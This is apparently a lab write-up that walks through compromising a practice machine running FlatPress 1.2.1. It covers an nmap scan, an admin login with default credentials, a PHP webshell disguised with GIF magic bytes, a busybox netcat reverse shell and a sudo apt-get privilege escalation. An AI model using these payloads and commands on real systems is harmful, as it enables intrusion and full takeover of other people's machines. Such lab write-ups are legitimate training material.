---
icon: ubuntu
---

# press - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
#Nmap TCP
nmap -A -T4 -p- -Pn 192.168.224.29 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-04 10:55 EDT
Nmap scan report for 192.168.224.29
Host is up (0.030s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Lugx Gaming Shop HTML5 Template
|_http-server-header: Apache/2.4.56 (Debian)
8089/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-generator: FlatPress fp-1.2.1
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: FlatPress
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   29.60 ms 192.168.45.1
2   29.57 ms 192.168.45.254
3   29.92 ms 192.168.251.1
4   24.87 ms 192.168.224.29
```

### <mark style="color:$primary;">HTTP Port 8089 TCP</mark>

<figure><img src="../../.gitbook/assets/image (769).png" alt=""><figcaption></figcaption></figure>

Login page uses default credentials admin:password

<figure><img src="../../.gitbook/assets/image (770).png" alt=""><figcaption></figcaption></figure>

I found an File Upload to RCE Overview for Flatpress on [**Github**](https://github.com/flatpressblog/flatpress/issues/152)

### <mark style="color:$primary;">**Flatpress 1.2.1 File Upload bypass to RCE**</mark>

Let's create our webshell payload with the GIF magic bytes. I'll save mine as shell.php

```
GIF89a;
<?php system($_REQUEST['cmd']); ?>
```

<figure><img src="../../.gitbook/assets/image (771).png" alt=""><figcaption></figcaption></figure>

Than we will go to uploader and upload our shell

<figure><img src="../../.gitbook/assets/image (772).png" alt=""><figcaption></figcaption></figure>

You should be able to see your upload in the media manager

<figure><img src="../../.gitbook/assets/image (773).png" alt=""><figcaption></figcaption></figure>

if you click on it, it will redirect you to its location

<figure><img src="../../.gitbook/assets/image (774).png" alt=""><figcaption></figcaption></figure>

nc is on the machine. So I will make use of it to get a reverse shell

```
busybox nc 192.168.45.158 80 -e /bin/bash
```

<figure><img src="../../.gitbook/assets/image (775).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (776).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (777).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Sudo apt-get</mark>

[**Gtfobins**](https://gtfobins.github.io/gtfobins/apt-get/#sudo) is our friend!

<figure><img src="../../.gitbook/assets/image (778).png" alt=""><figcaption></figcaption></figure>

I'll use the following command to privesc

```
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash
```

<figure><img src="../../.gitbook/assets/image (779).png" alt=""><figcaption></figcaption></figure>
